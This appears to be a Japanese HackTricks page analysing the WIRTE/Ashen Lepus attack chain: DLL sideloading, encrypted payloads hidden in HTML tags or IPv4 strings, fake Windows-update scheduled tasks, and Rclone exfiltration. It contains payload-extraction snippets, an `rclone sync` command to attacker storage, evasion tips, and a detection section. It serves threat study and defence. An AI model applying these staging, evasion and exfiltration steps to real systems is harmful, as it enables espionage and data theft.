# HTML埋め込みペイロードのステージングを用いた高度なDLLサイドローディング

{{#include ../../../banners/hacktricks-training.md}}

## 攻撃手法の概要

Ashen Lepus（別名WIRTE）は、DLLサイドローディング、段階的なHTMLペイロード、モジュール型.NETバックドアを連鎖させる再現可能なパターンを武器化し、中東の外交ネットワーク内で永続化しました。この手法は次の要素に依存するため、あらゆるオペレーターが再利用できます。<sup>[[1]](#references)</sup>

- **アーカイブを使ったソーシャルエンジニアリング**: 無害なPDFで標的にファイル共有サイトからRARアーカイブをダウンロードさせます。アーカイブには、本物らしいドキュメントビューアEXE、信頼されたライブラリ名（例: `netutils.dll`、`srvcli.dll`、`dwampi.dll`、`wtsapi32.dll`）を付けた悪意あるDLL、囮の`Document.pdf`が含まれます。
- **DLL検索順序の悪用**: 被害者がEXEをダブルクリックすると、WindowsはカレントディレクトリからDLLを解決します。悪意あるローダー（AshenLoader）は信頼されたプロセス内で実行され、疑いを避けるため囮のPDFを開きます。
- **Living-off-the-landによるステージング**: 後続の各ステージ（AshenStager → AshenOrchestrator → モジュール）は、必要になるまでディスクに保存されません。無害に見えるHTMLレスポンス内に隠された暗号化blobとして配信されます。

## マルチステージのサイドローディングチェーン

1. **囮EXE → AshenLoader**: EXEがAshenLoaderをサイドロードします。AshenLoaderはホストを調査し、AES-CTRで暗号化したデータを、`token=`、`id=`、`q=`、`auth=`などの変化するパラメーターに格納して、`/api/v2/account`などのAPI風パスへPOSTします。<sup>[[1]](#references)</sup>
2. **HTMLの抽出**: クライアントIPが標的地域に位置し、`User-Agent`がインプラントと一致した場合にのみ、C2は次のステージを返します。これによりサンドボックスを欺きます。チェックを通過すると、HTTP本文には、Base64/AES-CTRで暗号化されたAshenStagerペイロードを含む`<headerp>...</headerp>`のblobが格納されます。
3. **2回目のサイドロード**: AshenStagerは、`wtsapi32.dll`をインポートする別の正規バイナリとともに展開されます。バイナリに注入された悪意あるコピーは、さらにHTMLを取得し、今度は`<article>...</article>`を切り出してAshenOrchestratorを復元します。
4. **AshenOrchestrator**: Base64 JSON設定をデコードするモジュール型.NETコントローラーです。設定の`tg`フィールドと`au`フィールドを連結・ハッシュ化してAESキーを生成し、それを使って`xrk`を復号します。得られたバイト列は、以降に取得するすべてのモジュールblobのXORキーとして機能します。
5. **モジュールの配信**: 各モジュールは、パーサーを任意のタグへ誘導するHTMLコメントを通じて記述されます。これにより、`<headerp>`または`<article>`のみを探す静的ルールを回避します。モジュールには、永続化（`PR*`）、アンインストーラー（`UN*`）、偵察（`SN`）、画面キャプチャ（`SCT`）、ファイル探索（`FE`）が含まれます。

### HTMLコンテナの解析パターン

```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```

ディフェンダーが特定の要素をブロックまたは削除しても、オペレーターはHTMLコメントで示されたタグを変更するだけで配信を再開できます。<sup>[[1]](#references)</sup>

### クイック抽出ヘルパー（Python）

```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```

## HTML Staging Evasion Parallels

最近のHTML smugglingの調査（Talos）では、HTML添付ファイル内の`<script>`ブロックにBase64文字列として隠されたペイロードを、実行時にJavaScriptでデコードする手法が紹介されています。<sup>[[2]](#references)</sup> 同じ手法はC2レスポンスにも応用でき、暗号化されたblobをscriptタグ（または他のDOM要素）内にステージングし、AES/XOR処理の前にメモリ内でデコードすれば、ページを通常のHTMLに見せかけられます。Talosは、scriptタグ内で識別子のリネームとBase64/Caesar/AESを組み合わせた多層難読化も紹介しており、これはHTMLにステージングされたC2 blobにそのまま応用できます。<sup>[[2]](#references)</sup> 後のTalosによる**hidden text salting**に関する記事も参考になります。無関係なHTMLコメントや空白でBase64を分割するだけで、ブラウザ側での再構築は簡単なまま、単純な正規表現ベースの抽出器を回避できます。<sup>[[7]](#references)</sup>

## Recent Variant Notes (2024-2025)

- Check Pointは、2024年のWIRTEキャンペーンについて報告しました。このキャンペーンは引き続きアーカイブベースのsideloadingを中心としながらも、最初のステージに`propsys.dll`（stagerx64）を使用していました。stagerはBase64 + XOR（キー`53`）で次のペイロードをデコードし、ハードコードされた`User-Agent`でHTTPリクエストを送り、HTMLタグ間に埋め込まれた暗号化blobを抽出します。ある分岐では、`RtlIpv4StringToAddressA`でデコードする、埋め込まれた多数のIP文字列からステージを再構築し、それらを連結してペイロードのバイト列を生成していました。<sup>[[3]](#references)</sup>
- OWN-CERTは、以前のWIRTEツールについて記録しています。サイドロードされた`wtsapi32.dll`ドロッパーは、Base64 + TEAで文字列を保護し、DLL名そのものを復号キーとして使用していました。その後、ホスト識別データをXOR/Base64で難読化してC2に送信していました。<sup>[[4]](#references)</sup>

## Reconstructing IP-Encoded Stages

WIRTEの2024年の`propsys.dll`分岐では、次のPEを連続した1つのHTML blobとして格納する必要はありません。ローダーはステージのバイト列をdotted-quad形式の文字列として隠し、`RtlIpv4StringToAddressA`で再構築できます。この手法はHiveの**IPfuscation** tradecraftと密接に関連しています。<sup>[[3]](#references)[[5]](#references)</sup> 運用上、これは明らかなBase64ペイロードの代わりに、無害に見えるIOCや設定データをHTMLページに含めたい場合に有用です。

```python
import pathlib, re, socket

text = pathlib.Path("stage.txt").read_text(encoding="utf-8")
ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
blob = b"".join(socket.inet_aton(ip) for ip in ips)
pathlib.Path("stage.bin").write_bytes(blob)
```

復元したバイト列が `MZ` で始まる場合は、次の PE を直接再構築できた可能性が高いです。そうでない場合は、先頭に XOR/Base64 レイヤーがないか、アドレス間に小さな区切りチャンクがないか確認してください。

## 入れ替え可能な DLL 名とホストのローテーション

このパターンの大きな特徴は、**HTML/AES/XOR のステージングバックエンドをそのままに、sideload の組み合わせだけを変更できる**ことです。WIRTE はキャンペーンごとに `netutils.dll`、`srvcli.dll`、`dwampi.dll`、`wtsapi32.dll`、`propsys.dll` を使い分けており、これは次の点で有用です。<sup>[[1]](#references)[[3]](#references)</sup>

- `propsys.dll` と `wtsapi32.dll` は、`%System32%` / `%SysWOW64%` に存在すると防御側が予想する、ありふれた Windows DLL 名です。
- **HijackLibs** などの公開カタログには、コピーされたアプリケーションディレクトリからこれらの DLL 名を読み込むバイナリが多数掲載されているため、オペレーターはステージャーを再設計せずに代替ホストを利用できます。
- ホストごとに調整が必要なのは、エクスポートの構成だけです。HTML パーサー、AES/XOR ルーチン、モジュールローダーは、通常、そのまま転用してフォワーディングプロキシ DLL に組み込めます。

攻撃的なラボ作業では、問題を **(1) 選択した DLL 名をローカルで解決する、安定した署名済みホストを見つけること**と、**(2) その DLL の背後で同じ staged-HTML ローダーのロジックを再利用すること**に分けられます。

## 暗号化と C2 の強化

- **あらゆる箇所で AES-CTR**：現在のローダーは 256 ビットの鍵と nonce（例：`{9a 20 51 98 ...}`）を埋め込み、復号の前後に `msasn1.dll` などの文字列を使った XOR レイヤーを追加する場合もあります。<sup>[[1]](#references)</sup>
- **鍵素材のバリエーション**：以前のローダーは Base64 + TEA で埋め込み文字列を保護し、悪意のある DLL 名（例：`wtsapi32.dll`）から復号鍵を導出していました。<sup>[[4]](#references)</sup>
- **インフラの分離とサブドメイン偽装**：ステージングサーバーはツールごとに分離され、複数の ASN に分散してホストされるほか、正規サイトに見えるサブドメインを前段に置く場合もあります。これにより、1 つのステージが露見しても、残りのインフラまでは判明しません。
- **偵察データの隠蔽**：列挙データには高価値アプリを特定するための Program Files の一覧が含まれるようになり、ホストから送信される前に必ず暗号化されます。
- **URI の変更**：キャンペーンごとにクエリパラメーターと REST パスがローテーションします（`/api/v1/account?token=` → `/api/v2/account?auth=`）。これにより、脆弱な検知ルールが無効化されます。
- **User-Agent の固定と安全なリダイレクト**：C2 インフラは正確に一致する UA 文字列にのみ応答し、それ以外は正規のニュースサイトや健康情報サイトにリダイレクトして、通常の通信に紛れ込みます。
- **配信のゲート制御**：サーバーは地域制限され、実際のインプラントにのみ応答します。許可されていないクライアントには、不審に見えない HTML を返します。

## 永続化と実行ループ

AshenStager は Windows のメンテナンスタスクを装ったスケジュールタスクを作成し、`svchost.exe` 経由で実行します。例：<sup>[[1]](#references)</sup>

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

これらのタスクは、起動時または定期的に sideloading チェーンを再実行するため、AshenOrchestrator は再びディスクに触れることなく、新しいモジュールを要求できます。

## 正規の同期クライアントを使ったデータ持ち出し

オペレーターは専用モジュールを使い、外交文書を `C:\Users\Public`（全ユーザーが読み取り可能で、不審に見えない場所）にステージングした後、正規の [Rclone](https://rclone.org/) バイナリをダウンロードして、そのディレクトリを攻撃者のストレージと同期します。Unit42 によると、このアクターがデータ持ち出しに Rclone を使用するのが確認されたのは今回が初めてです。これは、正規の同期ツールを悪用して通常の通信に紛れ込むという、より広い傾向に沿ったものです。<sup>[[1]](#references)</sup>

1. **ステージング**：対象ファイルを `C:\Users\Public\{campaign}\` にコピーまたは収集します。
2. **設定**：攻撃者が管理する HTTPS エンドポイント（例：`api.technology-system[.]com`）を指定した Rclone 設定ファイルを配置します。
3. **同期**：`rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` を実行し、通信を通常のクラウドバックアップに似せます。

Rclone は正規のバックアップ業務で広く使われているため、防御側は異常な実行（新しいバイナリ、不審なリモート、`C:\Users\Public` の突然の同期など）に注目する必要があります。

## 検知の手がかり

- 署名済みプロセスが、ユーザーが書き込み可能なパスから予期せず DLL を読み込んでいないか検知します（Procmon のフィルター + `Get-ProcessMitigation -Module`）。特に DLL 名が `netutils`、`srvcli`、`dwampi`、`wtsapi32`、`propsys` と重なる場合に注目します。<sup>[[6]](#references)</sup>
- 不審な HTTPS 応答に、**見慣れないタグ内に埋め込まれた大きな Base64 blob** や、`<!-- TAG: <xyz> -->` コメントで保護されたデータがないか調べます。
- まず HTML を正規化します。**Base64 抽出の前にコメントを除去し、空白を圧縮してください**。hidden-text-salting 型の回避手法では、コメントの境界をまたいでペイロードが分割されることがあります。
- HTML の調査対象を、HTML smuggling 型のステージングとして `<script>` ブロック内に埋め込まれ、AES/XOR 処理の前に JavaScript でデコードされる **Base64 文字列**にも広げます。
- **`RtlIpv4StringToAddressA` の繰り返し呼び出しに続くバッファ組み立て**を探します。特に、周辺の文字列が実際のネットワーク宛先ではなく、長い IPv4 アドレスのリストである場合に注目します。
- 非サービス用の引数で `svchost.exe` を実行する、またはドロッパーディレクトリを参照する **スケジュールタスク**を探します。
- 正確に一致する `User-Agent` 文字列にのみペイロードを返し、それ以外は正規のニュースサイトや健康情報サイトにリダイレクトする **C2 のリダイレクト**を追跡します。
- IT 管理下にない場所に出現する **Rclone** バイナリ、新しい `rclone.conf` ファイル、`C:\Users\Public` などのステージングディレクトリからデータを同期するジョブを監視します。

## References

- [1] [Hamas に関連する Ashen Lepus が、新たな AshTag マルウェアスイートで中東の外交機関を標的に](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [2] [タグの間に隠されたもの：HTML smuggling における回避手法の知見](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [3] [Hamas に関連する脅威アクター WIRTE、中東での活動を継続し、破壊的な活動へ移行](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [4] [WIRTE：失われた時間を求めて](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
- [5] [Hive ランサムウェア、検知回避に新しい IPfuscation 手法を採用](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
- [6] [システム以外の場所からのシステム DLL sideloading の可能性](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
- [7] [隠しテキストによるソルティングでメールの脅威を味付けする](https://blog.talosintelligence.com/seasoning-email-threats-with-hidden-text-salting/)
{{#include ../../../banners/hacktricks-training.md}}
